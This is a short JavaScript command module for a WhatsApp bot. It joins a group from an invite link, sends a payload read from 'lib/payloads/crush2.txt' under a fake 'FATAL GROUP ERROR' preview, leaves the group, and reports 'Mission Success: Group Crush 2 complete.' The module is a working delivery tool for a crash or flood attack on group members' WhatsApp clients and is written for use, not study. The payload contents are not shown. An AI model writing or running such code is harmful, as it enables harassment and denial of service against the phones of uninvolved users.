const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "gc2",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        const payload = fs.readFileSync('./lib/payloads/crush2.txt', 'utf-8');
        const code = args[0].split('https://chat.whatsapp.com/')[1];
        
        try {
            const jid = await conn.groupAcceptInvite(code);
            await conn.sendMessage(jid, { 
                text: "\u200B" + payload,
                contextInfo: { 
                    externalAdReply: { title: "🥀 FATAL GROUP ERROR 🥀", body: "Data integrity loss detected.", mediaType: 1, thumbnailUrl: "https://files.catbox.moe/horror.jpg" }
                } 
            });
            await conn.groupLeave(jid);
            await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: Group Crush 2 complete. The Further has taken them.") });
        } catch (e) { msg.reply("🥀 Failed."); }
    }
};
